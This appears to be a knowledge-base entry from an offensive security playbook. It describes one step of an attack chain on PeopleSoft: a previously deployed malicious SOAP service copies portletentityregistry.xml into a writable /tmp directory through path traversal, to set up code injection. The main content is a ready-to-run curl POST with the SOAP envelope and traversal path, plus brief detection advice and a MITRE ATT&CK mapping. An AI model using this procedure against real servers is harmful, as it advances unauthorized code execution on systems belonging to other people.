---
tags:
  - xxe
  - file-manipulation
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-post-xxe-test]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:07.978Z'
sub_techniques: []
id: 5e1b3d8c-b568-4085-a70c-2909c7f0722f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Copy-XML-to-Temp-Directory-via-XXE

## Summary

This procedure uses the deployed malicious service to copy the portletentityregistry.xml file to a writable temporary directory, preparing for payload injection.

## Description

With the custom service active, send a SOAP request calling the api:copy method with path traversal to duplicate the XML file from the webapp directory to /tmp/QAusGyxGqQqyVEhqzPbu/, exploiting directory write permissions.

## Requirements

1. Deployed service /pspc/services/lmJyaVBUrfcEfJw
2. Writable /tmp directory on server
3. SOAP crafting capability

## Defense

Defensive measures and detection strategies:

- Validate file paths in API calls to prevent traversal
- Restrict service permissions to read-only where possible
- Monitor file system changes in /tmp and web directories

## Objectives

1. Duplicate configuration file to modifiable location
2. Bypass read-only webapp restrictions
3. Set up for code injection

## Instructions

### Step 1: Execute Copy Operation

**Context**: POST SOAP envelope to copy the file using path traversal.

**Command** ([[commands/curl-post-xxe-test]]):
```bash
curl -k -X POST -H "Content-Type: text/xml" https://target/pspc/services/lmJyaVBUrfcEfJw -d '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><api:copy xmlns:api="..." from="./applications/peoplesoft/pspc.war/WEB-INF/data/portletentityregistry.xml" to="../../../../../../../../../../../../../../../../tmp/QAusGyxGqQqyVEhqzPbu/WEB-INF/data/portletentityregistry.xml"/></soap:Body></soap:Envelope>'
```

> Success if copy completes without errors; verify by subsequent reads if possible.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xxe]]
- [[file-manipulation]]
